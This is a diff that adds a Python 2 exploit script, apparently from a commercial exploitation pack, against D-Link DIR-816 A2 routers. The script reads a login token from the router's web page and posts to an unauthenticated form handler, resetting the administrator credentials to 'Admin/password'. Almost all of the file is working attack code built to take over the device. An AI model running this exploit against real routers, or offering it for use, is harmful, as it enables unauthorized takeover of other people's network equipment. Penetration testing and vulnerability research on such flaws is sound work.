@@ -1,0 +1,51 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_link_28'
+_vendor_ = 'd-link'
+_model_  = ['DIR-816 A2']
+_vuln_   = 'Authentication Bypass Vulnerability'
+_cve_    = ''
+_ref_    = 'https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/edit_web_and_sys_account/README.md'
+_port_   = 80
+
+def get_token(host, port):
+    url = "http://%s:%d/dir_login.asp"%(host, port)
+    response = requests.get(url, allow_redirects=False)
+    m = re.search('name="tokenid"\\s+value="([^"]+)"',response.text)
+    if m is None:
+        return None
+    else:
+        return m.group(1)
+
+def pwnrouter(host,port=_port_):  
+  try:
+    tokenid = get_token(host, port)
+    if tokenid is None:
+      print '[+] %s not vulnerable' % host
+      return
+    username = "Admin"
+    password = "password"
+    data = {"admuser": username, "admpass": password, "tokenid": tokenid}
+    url = "http://%s:%d/goform/setSysAdm"%(host, port)
+    response = requests.post(url, data=data, allow_redirects=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return    
+  print '[+] %s vulnerable' % host
+  print '[+] new login/password: %s/%s'%(username, password)        
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
